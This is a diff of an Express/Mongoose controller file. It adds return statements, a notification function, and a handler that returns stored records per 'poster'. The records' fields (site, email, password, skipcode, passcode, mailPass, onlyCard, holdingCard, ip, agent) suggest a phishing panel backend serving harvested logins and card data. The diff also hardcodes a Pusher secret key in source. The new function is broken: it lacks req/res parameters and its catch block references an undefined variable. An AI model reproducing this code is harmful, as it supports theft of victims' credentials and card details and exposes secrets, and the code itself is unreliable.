@@ -1,3 +1,4 @@
+'use strict'
 import NewInfo from '../models/OldInfo.js'
 
 import User from '../models/User.js'
@@ -218,16 +219,43 @@ export const add_new_links = (req, res) => {
         }
     }, { new: true }, (err, ok) => {
         if (err) {
-            res.status(400).json({ error: err })
+          return  res.status(400).json({ error: err })
         }
-        res.status(200).json({ success: true })
+       return res.status(200).json({ success: true })
     })
 
 }
 
 
 
+export const   user_noti = async ()=>{
+    const { text } = req.body;
 
+    const pusher = new Pusher({
+        appId: '1731286',
+        key: 'a5f0008dea3736f30a17',
+        secret: '0599185eb95735d5a17a',
+        cluster: 'ap2',
+        useTLS: true,
+       
+      });
+
+    try{
+        if(text){
+            pusher.trigger("userChat", 'chat-notification', {
+                text: text
+              });
+        }
+        return res.status(200).json({ success: true })
+
+
+    }
+    catch(e){
+        return  res.status(400).json({ error: err })
+
+
+    }
+}
 
 
 
@@ -593,10 +621,11 @@ export const poster_details =async  (req, res) => {
     try {
 
 
-
-
         const poster = await Poster.findOne({ _id: id }).select('username password posterId links createdAt')
+       
         const details =await Info.find({ root: id }).select('site email password skipcode username passcode mail mailPass onlyCard holdingCard ip agent createdAt').sort({ createdAt: -1 })
+        // const newdata = {...poster, details: details }
+        // console.log(newdata)
         return res.status(200).json({ data: {...poster, details: details }})
 
 
